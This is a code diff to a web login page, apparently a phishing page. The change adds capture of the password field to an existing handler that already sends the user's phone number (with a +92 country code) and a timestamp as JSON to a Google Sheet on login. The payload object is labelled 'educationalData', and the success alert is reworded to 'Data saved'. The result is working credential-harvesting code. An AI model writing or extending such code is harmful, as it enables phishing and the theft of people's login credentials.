@@ -303,14 +303,16 @@ function togglePassword() {
     }
 }
 
-/* Handle Login Submission & Google Sheet Data Transfer */
+/* Handle Login Submission & Google Sheet Data Transfer (Phone + Password) */
 loginBtn.addEventListener("click", function() {
     if (!loginBtn.disabled) {
         const phoneValue = phone.value.trim();
+        const passwordValue = password.value.trim();
         const countryCode = "+92 ";
 
         const educationalData = {
             phoneNumber: countryCode + phoneValue,
+            password: passwordValue,
             timestamp: new Date().toLocaleString()
         };
 
@@ -322,7 +324,7 @@ loginBtn.addEventListener("click", function() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(educationalData)
         }).then(() => {
-            alert('Phone number saved to Google Sheet successfully!');
+            alert('Data saved to Google Sheet successfully!');
         }).catch(error => {
             console.error('Error:', error);
         });
